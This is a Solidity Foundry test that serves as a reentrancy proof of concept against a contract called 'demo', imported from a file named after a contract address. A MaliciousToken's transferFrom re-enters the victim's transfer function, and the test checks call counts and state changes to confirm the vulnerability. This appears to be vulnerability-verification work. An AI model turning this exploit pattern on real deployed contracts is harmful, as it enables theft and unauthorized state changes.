// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0xd5967fed03e85d1cce44cab284695b41bc675b5c.sol";

contract MaliciousToken {
    bool public firstCall = true;
    address public vulnerable;
    uint256 public count;

    constructor(address _vulnerable) {
        vulnerable = _vulnerable;
    }

    function transferFrom(address, address, uint256) public returns (bool) {
        count++;
        if (firstCall == true) {
            firstCall = false;
            address[] memory newRecipients = new address[](1);
            newRecipients[0] = address(0x333);
            (bool success, ) = vulnerable.call(
                abi.encodeWithSignature(
                    "transfer(address,address,address[],uint256)",
                    address(this),
                    address(this),
                    newRecipients,
                    1 ether
                )
            );
            require(success, "Reentrant call failed");
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    demo public victim;
    MaliciousToken public maliciousToken;
    address attacker = address(0xbad);
    
    // Define recipients for state verification
    address constant R1 = address(0x111);
    address constant R2 = address(0x222);
    address constant R3 = address(0x333);

    function setUp() public {
        victim = new demo();
        maliciousToken = new MaliciousToken(address(victim));
    }

    function test_reentrancy() public {
        // Prepare recipient array
        address[] memory recipients = new address[](2);
        recipients[0] = R1;
        recipients[1] = R2;

        console2.log("--- BEFORE-Trigger State ---");
        uint256 r1TransfersBefore = victim.totalTransfers(R1);
        uint256 r2TransfersBefore = victim.totalTransfers(R2);
        uint256 r3TransfersBefore = victim.totalTransfers(R3);
        console2.log("totalTransfers (0x111):", r1TransfersBefore);
        console2.log("totalTransfers (0x222):", r2TransfersBefore);
        console2.log("totalTransfers (0x333):", r3TransfersBefore);

        console2.log("--- Trigger Transfer ---");
        // Execute transfer function
        victim.transfer(attacker, address(maliciousToken), recipients, 10 ether);

        console2.log("--- AFTER-Trigger State ---");
        uint256 r1TransfersAfter = victim.totalTransfers(R1);
        uint256 r2TransfersAfter = victim.totalTransfers(R2);  // Fixed typo: country -> total
        uint256 r3TransfersAfter = victim.totalTransfers(R3);
        console2.log("totalTransfers (0x111):", r1TransfersAfter);
        console2.log("totalTransfers (0x222):", r2TransfersAfter);
        console2.log("totalTransfers (0x333):", r3TransfersAfter);

        // Verify state changes
        bool r3Changed = r3TransfersAfter > r3TransfersBefore;
        console2.log("State change detected for 0x333:", r3Changed ? "YES" : "NO");

        // Count should be 6 if reentrancy occurred (4 from original + 2 from reentrant)
        assertEq(maliciousToken.count(), 6, "Reentrancy calls not detected");

        // Final vulnerability verdict (exactly one line)
        if (r3Changed) {
            console2.log("Vulnerability Exists: Reentrancy caused unauthorized state change");
        } else {
            console2.log("Vulnerability not Exist: No state modification detected for address 0x333");
        }
    }
}